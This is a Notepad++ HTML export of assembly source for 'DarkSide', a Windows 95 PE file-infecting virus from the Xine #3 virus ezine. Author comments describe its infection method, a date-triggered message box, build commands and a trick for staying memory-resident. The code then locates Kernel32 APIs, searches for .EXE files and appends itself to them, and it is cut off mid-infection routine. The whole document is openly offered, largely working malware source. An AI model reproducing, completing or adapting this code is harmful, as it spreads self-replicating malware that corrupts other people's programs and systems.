<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #3 - Phile 204 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       DarkSide, by Murkry/IkX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  One of my earlier attempts at expanding the Last Section of a PE file</span><span class="sc0">
</span><span class="sc1">; after I heard about Jacky I had to try it out. this virus is buggy but</span><span class="sc0">
</span><span class="sc1">; it works on most PE files.</span><span class="sc0">
</span><span class="sc1">;  Anyway it also shows how to use the host for free Data space and calling</span><span class="sc0">
</span><span class="sc1">; other DLL the KErnel32 (user32) for a MsgBox</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Since few people had heard of it I figure I could release it again in Xine3.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                       DarkSide</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Designed and Built by</span><span class="sc0">
</span><span class="sc1">;       MurKry</span><span class="sc0">
</span><span class="sc1">; For Turmoil ezine</span><span class="sc0">
</span><span class="sc1">; NonResident PE infector</span><span class="sc0">
</span><span class="sc1">; Non Directory Jumping</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Will infect all "normal" PE win95 exe files</span><span class="sc0">
</span><span class="sc1">;  Normal being PE format and base image set to 400000h</span><span class="sc0">
</span><span class="sc1">;   This limation would require just to find where the file was located</span><span class="sc0">
</span><span class="sc1">;   memory, not the offset but the Base not a big deal but I am</span><span class="sc0">
</span><span class="sc1">;   busy so it will stay this the next virus will include this feature</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Uses the unint'ed Data area of the first data section it finds</span><span class="sc0">
</span><span class="sc1">;       but must have a minium of  600h bytes free</span><span class="sc0">
</span><span class="sc1">; this means it can infect a file that it can not jump from,</span><span class="sc0">
</span><span class="sc1">; due to the 600h limations</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Will display a Message box on March 9 bad day for me some years ago :)      </span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Use a simple GetProc routine to find the Address of several API calls</span><span class="sc0">
</span><span class="sc1">;       including the CallVxd0 routine which is used to access the</span><span class="sc0">
</span><span class="sc1">;       current date, why?  why not. There are better but not easier ways</span><span class="sc0">
</span><span class="sc1">;       Int21 lives on</span><span class="sc0">
</span><span class="sc1">; Well for those who have not played with the VxdCall0 int21</span><span class="sc0">
</span><span class="sc1">; not sure, if the API file read file write do this but I have written</span><span class="sc0">
</span><span class="sc1">; a routine using the fact that if you use the int 21 read\write file</span><span class="sc0">
</span><span class="sc1">; you can read the file into READ only area like 0BFF70000H or other</span><span class="sc0">
</span><span class="sc1">; READ only areas. If you do not see it yet this can enable a nonVXD way</span><span class="sc0">
</span><span class="sc1">; of going TSR in Win95!!!  Anyway my routine just call BEEP but it was</span><span class="sc0">
</span><span class="sc1">; called whenever the CreatProccessA was called Sadly this was only called</span><span class="sc0">
</span><span class="sc1">; in my limited testing when I used a debugger, never when Win95 called the</span><span class="sc0">
</span><span class="sc1">; the API. So this could be made into a virus that only infect when debuggers</span><span class="sc0">
</span><span class="sc1">; or when a process Spawned another Process.</span><span class="sc0">
</span><span class="sc1">; Enough chatter enjoy :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Thanks to the Members of LT for letting this humble submision join there</span><span class="sc0">
</span><span class="sc1">; Zine.</span><span class="sc0">
</span><span class="sc1">; Thanks to Yosha for Bug testing for me :-)</span><span class="sc0">
</span><span class="sc1">; I am quite sure there are other bugs but hey this is still a new area for</span><span class="sc0">
</span><span class="sc1">; most of us ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; make below into a .Bat file to compile</span><span class="sc0">
</span><span class="sc1">; Due to a bug i left in this sometimes this will</span><span class="sc0">
</span><span class="sc1">; infect itself and then its dead (I have no marker in Generation One</span><span class="sc0">
</span><span class="sc1">; So I renamed it to a .com file so this will not happen</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;-----------bat file to compile</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; tasm32 /ml /m3 Dark,,;</span><span class="sc0">
</span><span class="sc1">; tlink32 /Tpe /aa /c  Dark,Dark,, import32.lib</span><span class="sc0">
</span><span class="sc1">; del Dark.com</span><span class="sc0">
</span><span class="sc1">; ren Dark.exe Dark.com</span><span class="sc0">
 

</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc1">;----------------------------------------</span><span class="sc0">
</span><span class="sc1">;define the API calls that the host makes</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">          
</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">Beep</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">                  
</span><span class="sc1">;----------------------------------------</span><span class="sc0">
</span><span class="sc1">;----------------------------------------</span><span class="sc0">
</span><span class="sc5">Viruslen</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">EndViri</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">  </span><span class="sc4">)</span><span class="sc0"> 
 
</span><span class="sc5">K32</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0BFF70000H</span><span class="sc0">         </span><span class="sc1">;LOCATION OF THE KERNEL32</span><span class="sc0">
                                           </span><span class="sc1">;MODULE FOR WIN95</span><span class="sc0">
</span><span class="sc1">;----------------------------------------</span><span class="sc0">

</span><span class="sc1">;BELOW IS THE DATA AREA EQU FOR THE VIRUS</span><span class="sc0">
</span><span class="sc1">;ESI SHOULD POINT TO A  START OF A MIN OF 600K R/W DATA AREA (I HOPE :&gt; )</span><span class="sc0">
</span><span class="sc5">OrginIP</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">;store the orginal ip here</span><span class="sc0">
</span><span class="sc5">XXXX</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">04h</span><span class="sc0">             
                                         
</span><span class="sc5">Counter</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">08h</span><span class="sc0">            </span><span class="sc1">;used as a counter</span><span class="sc0">
</span><span class="sc5">SrchHdle</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">0Ch</span><span class="sc0">            </span><span class="sc1">;Srch handle for the</span><span class="sc0">
</span><span class="sc5">FleHdle</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">010h</span><span class="sc0">           </span><span class="sc1">;File handle</span><span class="sc0">
</span><span class="sc5">Vsize</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">014h</span><span class="sc0">           </span><span class="sc1">;holds the VirtualSize of the virus</span><span class="sc0">
</span><span class="sc5">PElocation</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">018h</span><span class="sc0">           </span><span class="sc1">; where PE header start</span><span class="sc0">
</span><span class="sc5">LocOfOldIP</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">01Ch</span><span class="sc0">           </span><span class="sc1">;where we will place the old ip</span><span class="sc0">
</span><span class="sc5">OldIP</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc0">           </span><span class="sc1">;Area to hold it b4 we write it </span><span class="sc0">
</span><span class="sc5">NewIP</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">024h</span><span class="sc0">           </span><span class="sc1">;NewIP           </span><span class="sc0">

</span><span class="sc5">VxDCall</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">028h</span><span class="sc0">           </span><span class="sc1">;BFF713D4</span><span class="sc0">
</span><span class="sc5">Create</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">02Ch</span><span class="sc0">           </span><span class="sc1">;BFF77817</span><span class="sc0">
</span><span class="sc5">Close</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">030h</span><span class="sc0">           </span><span class="sc1">;BFF980CF</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">034h</span><span class="sc0">           </span><span class="sc1">;BFF75806</span><span class="sc0">
</span><span class="sc5">FFirst</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">038h</span><span class="sc0">           </span><span class="sc1">;BFF77893</span><span class="sc0">
</span><span class="sc5">FNext</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">03Ch</span><span class="sc0">           </span><span class="sc1">;BFF778CB</span><span class="sc0">
</span><span class="sc5">Write</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc0">           </span><span class="sc1">;BFF7580D</span><span class="sc0">
</span><span class="sc5">Seek</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">044H</span><span class="sc0">           </span><span class="sc1">;BFFC16F8</span><span class="sc0">
</span><span class="sc5">GetMod</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">048h</span><span class="sc0">           </span><span class="sc1">;               lloadBFF77433</span><span class="sc0">
</span><span class="sc5">GetProc</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">04Ch</span><span class="sc0">           </span><span class="sc1">;BFF76C18</span><span class="sc0">

</span><span class="sc5">AddFunc</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">050h</span><span class="sc0">
</span><span class="sc5">AddName</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">054h</span><span class="sc0">
</span><span class="sc5">AddOrd</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0">      </span><span class="sc2">058h</span><span class="sc0">
</span><span class="sc5">baseF</span><span class="sc0">           </span><span class="sc9">Equ</span><span class="sc0">      </span><span class="sc2">05Ch</span><span class="sc0">
</span><span class="sc9">Export</span><span class="sc0">          </span><span class="sc9">Equ</span><span class="sc0">      </span><span class="sc2">060h</span><span class="sc0">
</span><span class="sc5">Nindex</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">064h</span><span class="sc0">
</span><span class="sc5">limit</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">MessBox</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">06Ch</span><span class="sc0">
</span><span class="sc5">ExeFile</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">070h</span><span class="sc0">   </span><span class="sc1">;'*.EXE,0 ;2a2e4558 45 00 00 00</span><span class="sc0">
</span><span class="sc5">Readin</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">078h</span><span class="sc0">   </span><span class="sc1">;#bytes read by the file read</span><span class="sc0">
</span><span class="sc5">filler</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">      </span><span class="sc2">07ch</span><span class="sc0">
</span><span class="sc1">;left open for other things ;)</span><span class="sc0">

</span><span class="sc5">SRCH</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">      </span><span class="sc2">0C0H</span><span class="sc0">            </span><span class="sc1">;length 139h I think ;)</span><span class="sc0">

</span><span class="sc1">;should end around 1a1h</span><span class="sc0">
</span><span class="sc1">;Used to read the header of the PE file 400h (1024) gives enough</span><span class="sc0">
</span><span class="sc1">;room for most PE files</span><span class="sc0">
 
</span><span class="sc5">BUFFER</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">200H</span><span class="sc0">            </span><span class="sc1">;buffer  for read write area</span><span class="sc0">
                                        </span><span class="sc1">; this leaves 400h free</span><span class="sc0">
                                        </span><span class="sc1">; or 1024D for us decimal users</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------- </span><span class="sc0">
</span><span class="sc1">; not used</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">                                        </span><span class="sc1">;the data area</span><span class="sc0">
</span><span class="sc5">storage</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">            
</span><span class="sc1">;--------------------------------------------------------------------- </span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------------------- </span><span class="sc0">


</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">;executable code starts here</span><span class="sc0">

</span><span class="sc5">HOST</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store everthing</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;the IP of the virus</span><span class="sc0">


        </span><span class="sc1">;here we are modifing the store EAX in the stack so we can</span><span class="sc0">
        </span><span class="sc1">;use it as a jump to return the host later</span><span class="sc0">
        </span><span class="sc1">;warning this will crash horrible in a non Win95 setup</span><span class="sc0">
        </span><span class="sc1">; I suspect it is not  true in other</span><span class="sc0">
        </span><span class="sc1">; OS (NT) that</span><span class="sc0">
        </span><span class="sc1">; eax = the entry point on start up or that the program is loaded at</span><span class="sc0">
        </span><span class="sc1">;400000h</span><span class="sc0">
        </span><span class="sc1">; On infect the virii checks if the image base is 400000</span><span class="sc0">
        </span><span class="sc1">; so the virus should be ok --I hope</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldip</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">HOST</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0400000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;fix the eax be 4 so we can return</span><span class="sc0">
                                        </span><span class="sc1">; to the host</span><span class="sc0">
                       
        </span><span class="sc6">CALL</span><span class="sc0">   </span><span class="sc5">GetDataSpace</span><span class="sc0">             </span><span class="sc1">;just checks for some empty</span><span class="sc0">
                                        </span><span class="sc1">;space note the routine will</span><span class="sc0">
                                        </span><span class="sc1">; fail if the image base is no</span><span class="sc0">
                                        </span><span class="sc1">;00400000 if esi = 0 then it</span><span class="sc0">
                                        </span><span class="sc1">; failed                                                </span><span class="sc0">

        </span><span class="sc6">OR</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">          </span><span class="sc1">;check if we found enough memory </span><span class="sc0">
        </span><span class="sc6">JZ</span><span class="sc0">     </span><span class="sc5">NotWinPopx</span><span class="sc0">       </span><span class="sc1">;for us to play with</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OrginIP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;store the start point</span><span class="sc0">
                                                </span><span class="sc1">;here eax in win95 = EIP</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">                             </span><span class="sc1">; stores are data here</span><span class="sc0">
                                                </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">CAll</span><span class="sc0">     </span><span class="sc5">GetAddress</span><span class="sc0">                     </span><span class="sc1">;we assume all is ok</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GotAddress</span><span class="sc0">                      </span><span class="sc1">; here </span><span class="sc0">

</span><span class="sc1">;====================================================================</span><span class="sc0">
</span><span class="sc1">;these are all the items the virus will import</span><span class="sc0">
</span><span class="sc1">; and the dll other than kernel 32</span><span class="sc0">

</span><span class="sc5">CR</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Clo</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'_lclose'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RF</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FF</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FN</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WF</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SK</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GM</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'LoadLibraryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;'GetModuleHandleA',0</span><span class="sc0">
</span><span class="sc5">GetPr</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">User</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'USER32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Messb</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;====================================================================</span><span class="sc0">

</span><span class="sc5">GotAddress</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">          </span><span class="sc1">;check if we had a problem</span><span class="sc0">
        </span><span class="sc6">JnZ</span><span class="sc0">    </span><span class="sc5">Win95</span><span class="sc0">             
 
</span><span class="sc5">NotWinPopx</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">NotWin95</span><span class="sc4">:</span><span class="sc0">
         
         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fini</span><span class="sc0">           </span><span class="sc1">;alldone leave the rest to the host</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Win95</span><span class="sc4">:</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">CheckDate</span><span class="sc0">       </span><span class="sc1">;uses the VxDcall to checkthe </span><span class="sc0">
                                </span><span class="sc1">;date  </span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">NotToday</span><span class="sc0">        </span><span class="sc1">;no display today</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">MessShow</span><span class="sc0">        </span><span class="sc1">;display</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">           </span><span class="sc1">;hey they agree user pressed yes</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">fini</span><span class="sc0">            </span><span class="sc1">;so give them a break</span><span class="sc0">
                                </span><span class="sc1">;so on this date we might not infect</span><span class="sc0">
                                </span><span class="sc1">; if the user agrees :)                                        </span><span class="sc0">
</span><span class="sc5">NotToday</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;ok now just do a typical find first find next to infect something</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFile</span><span class="sc0">        </span><span class="sc1">;find file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">FileFirst1</span><span class="sc0">      

</span><span class="sc5">TryTryAgain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetNextF</span><span class="sc0">

</span><span class="sc5">FileFirst1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NoFile</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CheckFile</span><span class="sc0">               </span><span class="sc1">;check is pe and</span><span class="sc0">
                                        </span><span class="sc1">;and if so returns with</span><span class="sc0">
                                        </span><span class="sc1">;loation of PE header</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">fileok</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileClose</span><span class="sc0">               </span><span class="sc1">;was not good</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TryTryAgain</span><span class="sc0">             </span><span class="sc1">;get out</span><span class="sc0">

</span><span class="sc5">fileok</span><span class="sc4">:</span><span class="sc0">
         
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InfectIt</span><span class="sc0">                </span><span class="sc1">;well is file was ok try to infect</span><span class="sc0">
 
         
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">TryTryAgain</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">FileClose</span><span class="sc0">
</span><span class="sc5">NoFile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">fini</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;if we reach here we know the file is open</span><span class="sc0">
</span><span class="sc1">;its a PE non infected</span><span class="sc0">
</span><span class="sc1">;murk</span><span class="sc0">
</span><span class="sc1">; 1 check if the last header is in our buffer and that the last</span><span class="sc0">
</span><span class="sc1">;    header is the end of the file should always be but ya never know ;)</span><span class="sc0">
</span><span class="sc1">; 2 Write ourselves to the end of the file</span><span class="sc0">
</span><span class="sc1">; 3 update the Header for our size and the flags should be 'or' with</span><span class="sc0">
</span><span class="sc1">;    with the code\exec flags so it can run</span><span class="sc0">
</span><span class="sc1">; 4 Update the rva for the entry point should be able to use the old</span><span class="sc0">
</span><span class="sc1">;       Vsize + VAddress = new Entry point</span><span class="sc0">
</span><span class="sc1">;       update the Size of code field in the PE</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                    </span><span class="sc0">
</span><span class="sc5">InfectIt</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SRCH</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;size of the exe</span><span class="sc0">
       </span><span class="sc6">Call</span><span class="sc0">     </span><span class="sc5">FileSeek</span><span class="sc0">

       </span><span class="sc1">;ok we are at the end of the file</span><span class="sc0">
       </span><span class="sc1">;now write ourselve there</span><span class="sc0">
       </span><span class="sc1">;but we need to keep the file alignment nonsense so</span><span class="sc0">
       </span><span class="sc1">;some calculations first</span><span class="sc0">

        </span><span class="sc1">;lets get the oldIP</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PElocation</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;esi holds the PE start</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;eip RVA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">OldIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Viruslen</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;file align is 3ch</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
